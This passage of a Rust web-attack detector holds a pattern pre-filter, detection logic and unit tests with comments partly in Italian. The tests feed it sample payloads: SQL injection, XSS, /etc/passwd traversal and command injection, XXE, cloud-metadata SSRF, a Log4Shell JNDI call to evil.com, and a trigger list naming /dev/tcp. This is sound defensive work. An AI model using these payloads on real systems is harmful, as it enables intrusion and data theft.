    add_pattern!(r"(?i)\$(?:function|mapReduce|accumulator|reduce)\s*:", WebAttackCategory::NoSqlInjection, 0.9);

    // Compile the RegexSet
    let regex_set = RegexSet::new(&patterns).expect("Failed to compile web attack RegexSet");

    (regex_set, entries)
});

/// Pre-filter: skip RegexSet for payloads that cannot contain attacks (Section A14).
///
/// Three-step elimination:
/// 1. payload length < 3 -- too short to be an attack vector
/// 2. 100% safe charset `[a-zA-Z0-9 .,;:!?\-]` -- no special chars means no injection
/// 3. at least 1 trigger keyword/char present before engaging the RegexSet
fn should_skip_scan(content: &str) -> bool {
    // Step 1: Too short to contain any meaningful attack pattern
    if content.len() < 3 {
        return true;
    }

    // Step 2: At least one trigger keyword MUST be present — checked FIRST.
    // Pre-empt the all_safe check: JWT/base64 payloads contengono solo
    // [A-Za-z0-9.] (all safe) ma sono trigger validi (eyJ, alg).
    const TRIGGERS: &[&str] = &[
        "select", "union", "script", "eval", "<", ">", "'", "\"",
        "/", "..", "\\x", "%0", "__proto__", "constructor", "jndi",
        "${", "{{", "<%", "127.0.0.1", "localhost", "169.254",
        "<!ENTITY", "Transfer-Encoding", "Sec-WebSocket",
        "eyJ", "alg", "jwt", "__schema", "__type",
        "GIF89a", "GIF87a", ".php", ".jsp", ".asp",
        "/proc/", "/dev/tcp", "/dev/udp", "python", "import",
        "X-aws", "0x7f", "\\\\", "mapReduce", "$function",
        "-----BEGIN", "http-equiv", "OUTFILE", "DUMPFILE",
        "Access-Control", "Origin:",
    ];
    let lower = content.to_lowercase();
    let has_trigger = TRIGGERS.iter().any(|t| lower.contains(&t.to_lowercase()));
    if has_trigger {
        return false; // trigger present → SCAN it
    }

    // Step 3: No trigger — fallback all_safe check (verboso testo umano).
    let all_safe = content.bytes().all(|b| matches!(b,
        b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' |
        b' ' | b'.' | b',' | b';' | b':' | b'!' | b'?' | b'-'
    ));
    if all_safe {
        return true;
    }

    // Step 4: presenti metacaratteri NON-safe ma nessun trigger della lista → SCANSIONA.
    // Pre-fix qui c'era `return true` (skip): un buco auto-inflitto. La lista TRIGGERS è
    // per forza incompleta (SSTI `#{...}`, LDAP `)(uid=*)`, command-injection backtick
    // `` `id` ``, ecc. non vi compaiono) → quei payload, pur pieni di metacaratteri,
    // venivano SALTATI senza scansione. Il RegexSet è O(n): scansionare contenuto con
    // caratteri speciali è il comportamento corretto per un WAF. Salta SOLO il testo
    // davvero innocuo (Step 3 all_safe) o troppo corto (Step 1).
    false
}

/// Web attack detector using compiled RegexSet (Aho-Corasick, O(n))
pub struct WebAttackDetector;

impl WebAttackDetector {
    /// Create a new detector
    pub fn new() -> Self {
        // Force lazy initialization at construction time
        let _ = &*WEB_ATTACK_PATTERNS;
        let _ = &*DISABLED_CATEGORIES;
        Self
    }

    /// Detect web attacks in content
    ///
    /// Returns all matching attack categories with severity scores.
    /// Uses RegexSet for O(n) matching across all 155+ patterns simultaneously.
    /// Pre-filter (Section A14) skips the RegexSet entirely for safe payloads.
    pub async fn detect(&self, content: &str) -> Vec<WebAttack> {
        // Pre-filter: skip RegexSet for safe payloads (Section A14)
        if should_skip_scan(content) {
            return Vec::new();
        }

        let (regex_set, entries) = &*WEB_ATTACK_PATTERNS;

        let matches: Vec<usize> = regex_set.matches(content).into_iter().collect();

        let mut attacks = Vec::new();
        let mut seen_categories: HashSet<WebAttackCategory> = HashSet::new();

        for pattern_index in matches {
            let entry = &entries[pattern_index];

            // Check if category is disabled via env var
            if DISABLED_CATEGORIES.contains(&entry.category.to_string()) {
                continue;
            }

            // Track highest severity per category (avoid duplicate flags)
            if !seen_categories.contains(&entry.category) {
                seen_categories.insert(entry.category);
                attacks.push(WebAttack {
                    category: entry.category,
                    severity: entry.severity,
                    pattern_index,
                });
            } else {
                // Update severity if this pattern has higher severity
                if let Some(existing) = attacks.iter_mut().find(|a| a.category == entry.category) {
                    if entry.severity > existing.severity {
                        existing.severity = entry.severity;
                        existing.pattern_index = pattern_index;
                    }
                }
            }
        }

        attacks
    }

    /// Get the total number of compiled patterns
    pub fn pattern_count(&self) -> usize {
        WEB_ATTACK_PATTERNS.1.len()
    }
}

impl Default for WebAttackDetector {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_clean_content() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("Hello, world! This is a normal request.").await;
        assert!(attacks.is_empty());
    }

    #[tokio::test]
    async fn test_sqli_union() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("UNION SELECT * FROM users").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::SqlInjection));
    }

    #[tokio::test]
    async fn test_sqli_sleep() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("1' AND SLEEP(5)--").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::SqlInjection));
    }

    #[tokio::test]
    async fn test_xss_script() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("<script>alert(1)</script>").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::Xss));
    }

    #[tokio::test]
    async fn test_xss_svg_onload() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("<svg onload=alert(1)>").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::Xss));
    }

    #[tokio::test]
    async fn test_xss_javascript_protocol() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("javascript:alert(document.cookie)").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::Xss));
    }

    #[tokio::test]
    async fn test_path_traversal() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("../../etc/passwd").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::PathTraversal));
    }

    #[tokio::test]
    async fn test_command_injection() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("; cat /etc/passwd").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::CommandInjection));
    }

    #[tokio::test]
    async fn test_xxe() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("<!ENTITY xxe SYSTEM 'file:///etc/passwd'>").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::Xxe));
    }

    #[tokio::test]
    async fn test_ssrf_cloud_metadata() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("http://169.254.169.254/latest/meta-data").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::Ssrf));
    }

    #[tokio::test]
    async fn test_log4shell() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("${jndi:ldap://evil.com/exploit}").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::Log4Shell));
        // Log4Shell should have maximum severity
        let log4shell = attacks.iter().find(|a| a.category == WebAttackCategory::Log4Shell).unwrap();
        assert!((log4shell.severity - 1.0).abs() < f64::EPSILON);
    }

    #[tokio::test]
    async fn test_prototype_pollution() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect(r#"{"__proto__": {"isAdmin": true}}"#).await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::PrototypePollution));
    }

    #[tokio::test]
    async fn test_nosql_injection() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect(r#"{"$ne": ""}"#).await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::NoSqlInjection));
    }

    #[tokio::test]
    async fn test_ssti() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("{{config.__class__.__init__}}").await;
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::Ssti));
    }

    #[tokio::test]
    async fn test_multiple_attacks() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("<script>alert(1)</script> UNION SELECT * FROM users").await;
        assert!(attacks.len() >= 2);
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::Xss));
        assert!(attacks.iter().any(|a| a.category == WebAttackCategory::SqlInjection));
    }

    #[tokio::test]
    async fn test_pattern_count() {
        let detector = WebAttackDetector::new();
        assert!(detector.pattern_count() >= 150, "Expected 150+ patterns, got {}", detector.pattern_count());
    }

    // ─── New category tests ─────────────────────────────────────────────────

    #[tokio::test]
    async fn test_jwt_none_algorithm() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect(r#"{"alg": "none", "typ": "JWT"}"#).await;
        assert!(
            attacks.iter().any(|a| a.category == WebAttackCategory::JwtAttack),
            "Expected JwtAttack for alg:none, got: {:?}",
            attacks.iter().map(|a| a.category).collect::<Vec<_>>()
        );
        let jwt = attacks.iter().find(|a| a.category == WebAttackCategory::JwtAttack).unwrap();
        assert!(jwt.severity >= 0.9, "JWT none algorithm should be high severity, got {}", jwt.severity);
    }

    #[tokio::test]
    async fn test_http_smuggling() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("Transfer-Encoding: chunked\r\nContent-Length: 42").await;
        assert!(
            attacks.iter().any(|a| a.category == WebAttackCategory::HttpSmuggling),
            "Expected HttpSmuggling for CL+TE, got: {:?}",
            attacks.iter().map(|a| a.category).collect::<Vec<_>>()
        );
    }

    #[tokio::test]
    async fn test_graphql_introspection() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("query { __schema { types { name } } }").await;
        assert!(
            attacks.iter().any(|a| a.category == WebAttackCategory::GraphqlAttack),
            "Expected GraphqlAttack for __schema, got: {:?}",
            attacks.iter().map(|a| a.category).collect::<Vec<_>>()
        );
    }

    #[tokio::test]
    async fn test_crlf_injection() {
        let detector = WebAttackDetector::new();
        let attacks = detector.detect("param=value%0d%0aSet-Cookie: evil=1").await;
        assert!(
            attacks.iter().any(|a| a.category == WebAttackCategory::CrlfInjection),
            "Expected CrlfInjection for %%0d%%0a, got: {:?}",
            attacks.iter().map(|a| a.category).collect::<Vec<_>>()
        );
    }

    #[tokio::test]
    async fn test_prefilter_safe_content() {
        // Pure alphanumeric + safe punctuation -- should be skipped entirely
        assert!(should_skip_scan("Hello world. This is safe content!"));
        assert!(should_skip_scan("ab"));      // too short
        assert!(should_skip_scan(""));         // empty
        assert!(should_skip_scan("Just some normal text, nothing dangerous here."));
    }

    #[tokio::test]
    async fn test_prefilter_with_trigger() {
        // Content with trigger keywords should NOT be skipped
        assert!(!should_skip_scan("<script>alert(1)</script>"));
        assert!(!should_skip_scan("UNION SELECT * FROM users"));
        assert!(!should_skip_scan("../../etc/passwd"));
        assert!(!should_skip_scan("${jndi:ldap://evil.com}"));
        assert!(!should_skip_scan("eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0"));
        assert!(!should_skip_scan("query { __schema { types } }"));
    }

    #[tokio::test]
    async fn test_prefilter_special_chars_without_trigger_are_scanned() {
        // 🚨 ANTI-REGRESSIONE (buco chiuso): payload pieni di metacaratteri ma SENZA un
        // trigger della lista NON devono essere saltati. Pre-fix `should_skip_scan`
        // tornava true (skip) → questi passavano senza scansione.
        assert!(!should_skip_scan("#{7*7}"), "SSTI Ruby/Java #{{}} deve essere scansionato");
        assert!(!should_skip_scan(")(uid=*)"), "LDAP injection deve essere scansionato");
        assert!(!should_skip_scan("`id`"), "command-injection backtick deve essere scansionato");
        assert!(!should_skip_scan("a|b&c;d"), "shell metachar devono essere scansionati");
        assert!(!should_skip_scan("value=#{T(java.lang.Runtime)}"), "SpEL deve essere scansionato");
        // ma il testo davvero innocuo continua a saltare (no over-scan / no FP di costo).
        assert!(should_skip_scan("Ciao, come stai oggi?"));
    }
}
